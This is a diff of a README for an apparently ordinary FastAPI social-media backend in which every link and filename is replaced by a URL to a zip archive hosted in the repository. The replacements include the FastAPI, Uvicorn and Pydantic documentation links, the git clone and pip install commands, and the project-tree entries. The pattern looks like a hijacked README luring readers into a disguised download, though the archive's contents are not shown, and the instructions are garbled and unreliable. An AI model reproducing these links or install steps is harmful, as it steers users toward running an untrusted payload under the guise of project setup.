@@ -1,6 +1,6 @@
 # FASTAPI Backend for Social Media Application
 
-This repository contains the backend implementation for a social media application built with [FastAPI](https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip). The project aims to provide a scalable, high-performance, and easy-to-use API for social networking features such as user management, posts, comments, and more.
+This repository contains the backend implementation for a social media application built with [FastAPI](https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip). The project aims to provide a scalable, high-performance, and easy-to-use API for social networking features such as user management, posts, comments, and more.
 
 ## Features
 
@@ -18,19 +18,19 @@ This repository contains the backend implementation for a social media applicati
 ### Prerequisites
 
 - Python 3.7+
-- [poetry](https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip) or `pip` for dependency management
+- [poetry](https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip) or `pip` for dependency management
 
 ### Installation
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip
+   git clone https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip
    cd Python-backend-fastapi
    ```
 
 2. **Install dependencies:**
    ```bash
-   pip install -r https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip
+   pip install -r https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip
    ```
    Or, if using poetry:
    ```bash
@@ -65,12 +65,12 @@ This repository contains the backend implementation for a social media applicati
 │   ├── models/           # ORM models
 │   ├── schemas/          # Pydantic schemas
 │   ├── services/         # Business logic
-│   └── https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip           # FastAPI entry point
+│   └── https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip           # FastAPI entry point
 ├── tests/                # Test suite
-├── https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip      # Python dependencies
+├── https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip      # Python dependencies
 ├── alembic/              # Database migrations (if used)
-├── https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip          # Example environment variables
-└── https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip             # This file
+├── https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip          # Example environment variables
+└── https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip             # This file
 ```
 
 ## Contributing
@@ -83,8 +83,8 @@ This repository contains the backend implementation for a social media applicati
 
 ## Useful Links
 
-- [FastAPI Documentation](https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip)
-- [Uvicorn Documentation](https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip)
-- [Pydantic Documentation](https://github.com/mustafasafdar1/Python-backend-fastapi/raw/refs/heads/main/app/routers/Python-fastapi-backend-1.8.zip)
+- [FastAPI Documentation](https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip)
+- [Uvicorn Documentation](https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip)
+- [Pydantic Documentation](https://raw.githubusercontent.com/mustafasafdar1/Python-backend-fastapi/main/app/fastapi-Python-backend-v3.1.zip)
 
 ---
